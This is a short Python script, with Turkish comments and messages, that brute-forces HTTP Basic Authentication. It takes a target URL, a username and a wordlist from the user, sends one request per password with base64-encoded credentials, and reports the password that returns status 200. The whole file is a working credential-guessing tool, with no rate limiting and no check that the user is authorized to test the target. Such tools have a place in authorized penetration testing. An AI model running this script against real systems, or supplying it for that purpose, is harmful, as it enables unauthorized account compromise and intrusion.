import requests
import base64

def brute_force(url, username, wordlist_file):
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist dosyası bulunamadı: {wordlist_file}")
        return

    print(f"[+] {len(passwords)} adet parola yüklendi. Brute force başlatılıyor...")

    for password in passwords:
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode()).decode()
        headers = {
            'Authorization': f'Basic {encoded_credentials}'
        }

        try:
            response = requests.get(url, headers=headers)

            if response.status_code == 200:
                print(f"[✓] Başarılı giriş! Kullanıcı: {username} | Parola: {password}")
                return
            else:
                print(f"[-] Hatalı parola: {password} (Durum Kodu: {response.status_code})")

        except requests.RequestException as e:
            print(f"[!] Hata oluştu: {e}")

    print("[-] Tüm parolalar denendi, başarılı giriş sağlanamadı.")

if __name__ == "__main__":
    # Kullanıcıdan input alınır
    target_url = input("Hedef URL (Basic Auth korumalı): ").strip()  # URL
    user = input("Kullanıcı adı: ").strip()  # Kullanıcı adı
    wordlist = input("Wordlist dosya yolu: ").strip()  # Wordlist dosyası

    # Brute force işlemi başlatılır
    brute_force(target_url, user, wordlist)
